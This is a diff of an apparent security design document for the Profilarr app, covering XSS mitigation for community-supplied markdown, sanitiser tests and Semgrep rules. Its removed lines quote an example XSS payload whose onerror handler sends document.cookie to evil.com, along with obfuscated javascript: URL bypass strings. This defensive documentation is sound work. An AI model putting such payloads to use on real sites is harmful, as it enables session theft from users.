@@ -486,39 +486,38 @@ Svelte's `{@html}` directive renders raw HTML without escaping. Any content that
 flows through `{@html}` without sanitisation is an XSS vector.
 
 **The attack**: Profilarr clones PCD databases maintained by community
-developers. These databases contain markdown fields - quality profile
-descriptions, custom format descriptions, etc. A malicious or compromised
-developer could inject JavaScript into a description field:
+developers. These databases contain markdown fields: quality profile and custom
+format descriptions, regex descriptions, announcements. A malicious or
+compromised developer could put a tag with an inline event handler in one of
+them. Every user who links that database would run it whenever the description
+renders, inside their authenticated session.
 
-```markdown
-Great profile for 1080p
+**Mitigation**: descriptions are markdown only. `renderMarkdown()` in
+`src/lib/shared/utils/markdown.ts` is the single renderer, used on the server
+and in the browser, and every `{@html}` of author content takes its output. It
+configures `marked` so that:
 
-<!-- <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)"> -->
-```
+- raw HTML in the source, block or inline, is escaped and shown as text;
+- link and image URLs are entity-decoded, whitespace-stripped and checked
+  against a scheme allowlist (`http:`, `https:`, `mailto:`, relative). A
+  rejected link keeps only its text; a rejected image keeps only its alt text;
+- `links: false` turns every link into plain text, for descriptions shown
+  inside a card that is itself a link.
 
-Every user who clones that database would execute the payload whenever the
-description renders. The attacker could steal session cookies, exfiltrate API
-keys displayed on the page, or redirect to a phishing page - all without needing
-to authenticate.
+The result then passes through `sanitizeHtml()` in `sanitize.ts` as a second
+layer. It parses each tag the way a browser does (quoted, unquoted and
+valueless attributes, slash separators), rebuilds allowed tags from allowlisted
+attributes only, drops everything else including the content of raw-text
+elements such as `<script>`, and escapes any `<` that does not form a
+well-formed tag. In normal operation it changes nothing, because `marked` has
+already produced clean output. It exists so a change in `marked` cannot quietly
+reopen the page to author-written markup.
 
-**Mitigation**: The `Markdown.svelte` component (the primary markdown renderer)
-passes all `marked.parse()` output through `sanitizeHtml()` from
-`$shared/utils/sanitize.ts` before rendering with `{@html}`. The sanitizer
-strips `<script>` tags, event handlers (`onerror`, `onclick`, etc.), and any
-tags/attributes not on an explicit allowlist. URL attributes (`href`, `src`) are
-decoded (HTML entities, whitespace) and validated against a protocol allowlist
-(`http:`, `https:`, `mailto:`) before being emitted, which prevents
-entity-encoded (`jav&#x61;script:`) and whitespace-obfuscated (`java\nscript:`)
-bypass variants.
-
-The same `sanitizeHtml()` function is used server-side in
-`$utils/markdown/markdown.ts` for any markdown rendered in load functions.
-
-**Semgrep enforcement**: Custom rules in `tests/scan/semgrep/xss.yml` flag any
-use of `marked.parse()` in Svelte files and any raw variable in `{@html}`,
-ensuring new code is reviewed for sanitisation. Because Semgrep uses regex
-matching for Svelte (no AST support), it cannot verify that sanitisation wraps
-the call - verified-safe instances use `nosemgrep` comments with justification.
+**Semgrep enforcement**: `tests/scan/semgrep/xss.yml` fails on any `marked`
+import outside the shared renderer, and flags every `{@html}` and any raw
+variable in `{@html}` for review. Because Semgrep uses regex matching for Svelte
+(no AST support), reviewed-safe `{@html}` uses carry a `nosemgrep` comment with
+justification.
 
 ### Path Traversal
 
@@ -583,9 +582,10 @@ needed.
 
 **Sanitize tests** (`tests/unit/sanitize/`):
 
-| File               | Tests                                                                                        |
-| ------------------ | -------------------------------------------------------------------------------------------- |
-| `sanitize.test.ts` | Entity-encoded/case-varied/whitespace-obfuscated javascript: bypass, allowed/disallowed tags |
+| File               | Tests                                                                                                                                                                              |
+| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `sanitize.test.ts` | Output filter: quoted and unquoted event handlers, obfuscated `javascript:` URLs, disallowed attributes and tags; each payload checked raw and after `marked`; allowed markup kept |
+| `markdown.test.ts` | Renderer: raw HTML escaped in block and inline mode, link and image scheme checks, `links: false`, GFM features intact                                                             |
 
 ### Integration Tests (`tests/integration/auth/specs/`)
 
@@ -594,34 +594,42 @@ end-to-end over HTTP. Uses a custom test harness with `TestClient` (cookie jar),
 `ServerManager`, and Docker Compose for OIDC/TLS scenarios. Specs auto-discover
 and run in parallel via `deno task test integration`.
 
-| File                        | Port             | Tests                                                                                               |
-| --------------------------- | ---------------- | --------------------------------------------------------------------------------------------------- |
-| `health.test.ts`            | 7001             | Public health vs authenticated diagnostics, no info disclosure                                      |
-| `csrf.test.ts`              | 7002, 7012, 7014 | Origin checking, no-origin fallback, reverse proxy CSRF with adapter rewrite                        |
-| `cookie.test.ts`            | 7003, 7013       | Secure flag (HTTPS vs HTTP), httpOnly, SameSite, path, expiration                                   |
-| `apiKey.test.ts`            | 7000             | Valid/invalid key, header-only, 401 on missing, 403 for non-API paths and key management            |
-| `apiKeyPermissions.test.ts` | 7020             | Read vs write, other areas, unknown access values, expiry 401, deletion, last_used_at               |
-| `envApiKey.test.ts`         | 7018             | Env key works alongside stored keys, "Environment" name reserved                                    |
-| `session.test.ts`           | 7005             | Redirect flow, expiration, sliding expiration halfway extend, 401 JSON, logout CSRF protection      |
-| `oidc.test.ts`              | 7006, 7009, 7010 | Full OIDC flow, state/nonce tampering, rejected when SSO isn't enabled, proxy flow                  |
-| `loginMethods.test.ts`      | 7021-7027, 7029  | One server per login scenario: setup, login page options, sign-in, `oidc` alias warning, lockout    |
-| `localAccount.test.ts`      | 7028             | Create Local Account from an SSO session, refusals, change password guard, sessions across accounts |
-| `rateLimit.test.ts`         | 7007             | Suspicious/typo thresholds, successful login clears, window expiry                                  |
-| `proxy.test.ts`             | 7008             | Full flow through Caddy TLS, X-Forwarded-For recording, CSRF through proxy                          |
-| `xForwardedFor.test.ts`     | 7015             | Spoofed header limited to session metadata; login throttling uses real TCP                          |
-| `secretExposure.test.ts`    | 7016             | 16 page checks - no raw secrets in frontend responses (assumes stolen session)                      |
-| `backupSecrets.test.ts`     | 7017             | 9 checks - backup DB copy has all secrets stripped, auth tables emptied                             |
-| `pathTraversal.test.ts`     | 7018             | 15 checks - ../ , absolute path, and symlink escape rejection across 3 endpoints                    |
-| `localBypass.test.ts`       | 7019             | Local bypass removal: requests from local addresses require auth                                    |
+| File                        | Port             | Tests                                                                                                 |
+| --------------------------- | ---------------- | ----------------------------------------------------------------------------------------------------- |
+| `health.test.ts`            | 7001             | Public health vs authenticated diagnostics, no info disclosure                                        |
+| `csrf.test.ts`              | 7002, 7012, 7014 | Origin checking, no-origin fallback, reverse proxy CSRF with adapter rewrite                          |
+| `cookie.test.ts`            | 7003, 7013       | Secure flag (HTTPS vs HTTP), httpOnly, SameSite, path, expiration                                     |
+| `apiKey.test.ts`            | 7000             | Valid/invalid key, header-only, 401 on missing, 403 for non-API paths and key management              |
+| `apiKeyPermissions.test.ts` | 7020             | Read vs write, other areas, unknown access values, expiry 401, deletion, last_used_at                 |
+| `envApiKey.test.ts`         | 7018             | Env key works alongside stored keys, "Environment" name reserved                                      |
+| `session.test.ts`           | 7005             | Redirect flow, expiration, sliding expiration halfway extend, 401 JSON, logout CSRF protection        |
+| `oidc.test.ts`              | 7006, 7009, 7010 | Full OIDC flow, state/nonce tampering, rejected when SSO isn't enabled, proxy flow                    |
+| `loginMethods.test.ts`      | 7021-7027, 7029  | One server per login scenario: setup, login page options, sign-in, `oidc` alias warning, lockout      |
+| `localAccount.test.ts`      | 7028             | Create Local Account from an SSO session, refusals, change password guard, sessions across accounts   |
+| `rateLimit.test.ts`         | 7007             | Suspicious/typo thresholds, successful login clears, window expiry                                    |
+| `proxy.test.ts`             | 7008             | Full flow through Caddy TLS, X-Forwarded-For recording, CSRF through proxy                            |
+| `xForwardedFor.test.ts`     | 7015             | Spoofed header limited to session metadata; login throttling uses real TCP                            |
+| `secretExposure.test.ts`    | 7016             | 16 page checks - no raw secrets in frontend responses (assumes stolen session)                        |
+| `backupSecrets.test.ts`     | 7017             | 9 checks - backup DB copy has all secrets stripped, auth tables emptied                               |
+| `pathTraversal.test.ts`     | 7018             | 15 checks - ../ , absolute path, and symlink escape rejection across 3 endpoints                      |
+| `localBypass.test.ts`       | 7019             | Local bypass removal: requests from local addresses require auth                                      |
+| `xss.test.ts`               | 7032             | Seeded PCD descriptions with an unquoted event handler never reach custom format or profile page HTML |
 
-### E2E Tests (`tests/e2e/auth/`)
+### E2E Tests (`tests/e2e/`)
 
-Browser-level Playwright tests that drive the real user experience. Uses
-`deno task test e2e auth` with Docker Compose (mock-oauth2-server + Caddy).
+Browser-level Playwright tests that drive the real user experience.
+`deno task test e2e` runs every suite in parallel, each in its own runner
+process on its own `PORTS.e2e` ports, and prints one line per suite.
+`deno task test e2e auth` uses Docker Compose (mock-oauth2-server + Caddy).
+`deno task test e2e sanitize` starts one preview server with `AUTH=off`, seeds
+it through the shared harness, and needs no Docker. Pass `--debug` with a
+single target, and `--grep=<pattern>` to pick one test, since debug mode stops
+at the first failure.
 
-| File           | Tests                                                          |
-| -------------- | -------------------------------------------------------------- |
-| `oidc.spec.ts` | Full OIDC login flow in browser, both direct and through proxy |
+| File                   | Tests                                                                                                                                   |
+| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
+| `auth/oidc.spec.ts`    | Full OIDC login flow in browser, both direct and through proxy                                                                          |
+| `sanitize/xss.spec.ts` | Seeded custom format and announcement markdown with an unquoted event handler never executes, on direct load and client-side navigation |
 
 ### Security Scans (`tests/scan/`)
 
@@ -650,13 +658,13 @@ positive to suppress with a justification comment.
 
 **Custom rulesets** (`tests/scan/semgrep/`):
 
-| File          | What it catches                                                                   |
-| ------------- | --------------------------------------------------------------------------------- |
-| `xss.yml`     | `{@html}` without sanitisation, `marked.parse()` in Svelte, unescaped table cells |
-| `sql.yml`     | Template literal interpolation in SQL (exempts known-safe patterns)               |
-| `secrets.yml` | Sensitive field names in logger metadata                                          |
-| `deno.yml`    | Deno-specific patterns (file I/O review)                                          |
-| `csharp.yml`  | C# parser service patterns (file I/O review)                                      |
+| File          | What it catches                                                                       |
+| ------------- | ------------------------------------------------------------------------------------- |
+| `xss.yml`     | `{@html}` usage, `marked` imported outside the shared renderer, unescaped table cells |
+| `sql.yml`     | Template literal interpolation in SQL (exempts known-safe patterns)                   |
+| `secrets.yml` | Sensitive field names in logger metadata                                              |
+| `deno.yml`    | Deno-specific patterns (file I/O review)                                              |
+| `csharp.yml`  | C# parser service patterns (file I/O review)                                          |
 
 **Suppressing false positives**: Use `nosemgrep` with the full rule ID and a
 justification. The comment must be on the matched line or the line immediately
@@ -671,7 +679,7 @@ For Svelte templates where JS comments aren't valid, use an HTML comment on the
 same line as the `{@html}`:
 
 ```svelte
-{@html parseMarkdown(text)}<!-- nosemgrep: profilarr.xss.at-html-usage -->
+{@html renderMarkdown(text)}<!-- nosemgrep: profilarr.xss.at-html-usage -->
 ```
 
 **Limitations**:
